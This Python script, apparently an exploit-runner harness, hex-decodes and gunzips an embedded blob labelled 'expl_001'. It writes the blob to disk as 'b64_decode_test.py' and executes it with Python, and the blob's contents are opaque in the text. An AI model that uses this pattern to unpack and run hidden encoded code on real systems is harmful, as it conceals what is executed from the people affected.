import sys, re, gzip, binascii, pty
from subprocess import Popen, PIPE

# takes a hex-encoded string representing a gzip file, outputs it as a gzip file, and gunzips it
def construct_file(file_hex_string, filename):
    try:
        unhexed = binascii.unhexlify(file_hex_string)               # revert string to binary
        with open(filename+'.gz', 'wb') as outfile_compressed:
            outfile_compressed.write(unhexed)                       # write out gzip file
        with gzip.open(filename+'.gz', 'rb') as infile_compressed:
            final_output = infile_compressed.read()                 # decompress gzip file
        with open(filename, 'wb') as outfile_uncompressed:
            outfile_uncompressed.write(final_output)                # write out decompressed file
    except:
        print('File decompression failed. Exiting.')
        exit(1)
    return

def execute_exploit(filename, pre_args, post_args):
    pArgs=[pre_args, filename, post_args]
    p = Popen(pArgs, stdout=PIPE)
    (output, err) = p.communicate()
    print(output)
    #pty.spawn(pre_args+' '+filename+' '+post_args)

####################
##    exploits    ##
####################

# Format
# variable = ["encoded string", 'filename', 'pre-args', 'post-args']
#
# 'pre-args' are anything that come before the filename

expl_001 = ["1f8b08085dfafd5a02ff6236345f6465636f64652e7079003d8e410ac2301444f739c5d0558212104a17054f222e7e9bb47ed024fc848ab76f6ad0d9bd99b7187ea5280513653ff467e44f56eacde581987c80ae6c49d6ed76b91b50c6322ad4382a842b162b9e9c364a1d85cd4538554ac2a1e82e0aaf1ce8f9b5477438a11afa20f3979c9fa3f3aecded859d86bed53f77073ae2c83fa5000000", 'b64_decode_test.py', 'python', 'test.b64']

###################
##     _main     ##
###################

if __name__ == "__main__":
   construct_file(expl_001[0], expl_001[1])
   print(expl_001[1]+', '+expl_001[2]+', '+expl_001[3])
   execute_exploit(expl_001[1], expl_001[2], expl_001[3])



